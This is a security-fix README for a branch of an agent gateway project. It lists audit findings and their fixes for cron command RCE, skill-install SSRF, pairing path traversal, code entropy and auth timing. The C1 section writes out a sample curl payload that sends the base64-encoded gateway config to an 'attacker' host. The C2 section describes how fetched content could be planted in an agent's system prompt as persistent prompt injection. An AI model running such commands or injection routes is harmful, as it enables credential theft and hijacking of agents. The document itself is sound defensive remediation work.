# Security Fixes — `security/critical-fixes` branch

This branch addresses an audit of the `main` branch at commit `52bf599`.
Findings are labelled with the IDs used in the original report
(`C` = critical, `H` = high, `M` = medium, `L` = low).

## Summary of shipped fixes

| ID | Severity | Area | Status |
|----|----------|------|--------|
| C1 | CRITICAL | REST cron API RCE via `type: 'command'` jobs | **Fixed** |
| C2 | CRITICAL | SSRF + prompt-injection via `skill_install` | **Fixed** |
| H1 | HIGH | Pairing `senderId` path-traversal | **Fixed** |
| H2 | HIGH | Pairing code entropy + TTL | **Fixed** |
| H3 | HIGH | API auth length-based timing side channel | **Fixed** |
| L1 | LOW  | No explicit `express.json` body cap | **Fixed** |

The remaining medium/low findings (M1–M4, L2, L3) are documented at the end
of this file as follow-ups.

---

## C1 — Cron shell command RCE

**Before.** `POST /api/v1/crons` accepted `type: 'command'` jobs whose
`command` string was passed verbatim to `child_process.exec()`
(`src/cron/manager.ts`). Any API key — even one scoped to a single
agent — could pivot to full host RCE:

```
POST /api/v1/crons
{ agentId, type: 'command',
  command: "curl attacker/$(cat ~/.claude-gateway/config.json | base64)" }
```

**Fix.** Introduced a capability scope on `ApiKey`:

- `src/types.ts` adds `ApiKeyScope = 'cron:command'` and an optional
  `scopes?: ApiKeyScope[]` field.
- `src/api/auth.ts` exports `hasScope(apiKey, scope)`.
- `src/api/cron-router.ts` rejects `type: 'command'` creation, update, and
  manual runs unless the authenticating key has `cron:command`.
  The scope is **never** the default — keys must be granted it explicitly.

Tests: `tests/unit/cron-router.test.ts` adds a `SEC-C1` suite covering the
gate on create and the implicit-default code path.

## C2 — Skill-install SSRF

**Before.** `mcp/tools/skills/handlers.ts::installSkill` validated only
`url.startsWith('https://')` and then wrote the response into
`SKILL.md`, where it is hot-reloaded into the agent's system prompt. An
attacker could point at `https://169.254.169.254/...` (AWS IMDS),
`https://localhost:8200` (Vault), or any internal host and plant the
exfiltrated content as a persistent prompt-injection payload.

**Fix.** New module `mcp/tools/skills/url-guard.ts`:

- HTTPS-only, plus a host allowlist
  (`raw.githubusercontent.com`, `gist.githubusercontent.com`, `github.com`
  by default — override via `CLAUDE_GATEWAY_SKILL_HOSTS`).
- DNS lookup with `all: true`; any resolved address in loopback, RFC1918,
  link-local (incl. metadata `169.254.169.254`), CGNAT, ULA, multicast,
  or IPv4-mapped IPv6 is rejected.
- Redirects are followed **manually** with the same host+IP check on each
  hop; capped at 3 redirects, 10s overall timeout, and the caller-provided
  body byte cap.

`installSkill` delegates to `guardedFetchText`, and the response URL
echoed back to the caller is the final resolved URL (not attacker input).

Tests: `tests/unit/skills-url-guard.test.ts` exercises `isForbiddenIp`
against 21 blocked ranges and 6 allowed public addresses.

## H1 — Pairing `senderId` validation

**Before.** `scripts/pair.ts` read `senderId` from `access.json` and used
it as a filename (`path.join(approvedDir, senderId)`) without validation.
A manually-tampered pending map could therefore write outside
`approvedDir`.

**Fix.** Both the receiver (`mcp/tools/telegram/receiver-server.ts`) and
the pairing script (`scripts/pair.ts`) now require `senderId` to match
`/^\d+$/` and `chatId` to match `/^-?\d+$/` before accepting the entry.
The receiver rejects the pairing before creating a pending record; the
script fails closed before writing files on disk.

## H2 — Pairing code entropy + TTL

**Before.** Pairing codes were `randomBytes(3).toString('hex')` (~24
bits) with a 1-hour TTL and pending cap of 3.

**Fix.** Codes are now 4 bytes / 8 hex chars (~32 bits) and the TTL is
tightened to 15 minutes. Still human-typable from the operator's console
but no longer feasible to brute-force in the expiry window.

## H3 — API auth length-based timing

**Before.** `src/api/auth.ts` short-circuited with
`if (keyBuf.length !== tokenBuf.length) return false` before calling
`timingSafeEqual`, which leaked the configured key length.

**Fix.** Both the token and each candidate key are hashed with SHA-256
before comparison, so `timingSafeEqual` always receives two 32-byte
buffers. Existing `tests/unit/api-auth.test.ts` continues to pass.

## L1 — Body size cap

`src/api/gateway-router.ts` now calls `express.json({ limit: '64kb' })`
instead of relying on the framework default.

---

## Remaining follow-ups (out of scope for this branch)

| ID | Why deferred | Suggested owner |
|----|--------------|-----------------|
| M1 | `guardedFetchText` already enforces `maxBytes` after read; switching to streaming with `Content-Length` check is an optimisation, not a blocker. | infra |
| M2 | `CLAUDE_BIN` splitting on whitespace needs a proper tokeniser or `execFile`; combined with the `dangerouslySkipPermissions` default it's serious. Tracked separately. | core |
| M3 | Skill `install` directives (`brew|npm|apt|python`) appear only in the schema — no runtime invokes them yet. Revisit before the dispatcher is wired up. | skills |
| M4 | Telegram bot token is still passed via child env. Refactor to stdin/ephemeral file is a bigger change. | telegram plugin |
| L2 | `access.json` corruption auto-moves the file aside, enabling a reset-via-corruption loop. Needs a safer recovery policy. | telegram plugin |
| L3 | `create-agent.ts` uses `--dangerously-skip-permissions` with user-provided description. Should route through a sandboxed subprocess. | wizard |

## Running the security-relevant test suites

```bash
npm install
npx jest tests/unit/cron-router.test.ts \
         tests/unit/api-auth.test.ts \
         tests/unit/skills-url-guard.test.ts \
         tests/unit/skills-integration.test.ts \
         tests/unit/cron-manager.test.ts \
         tests/unit/telegram-receiver.test.ts
```

All 110 tests pass on this branch.
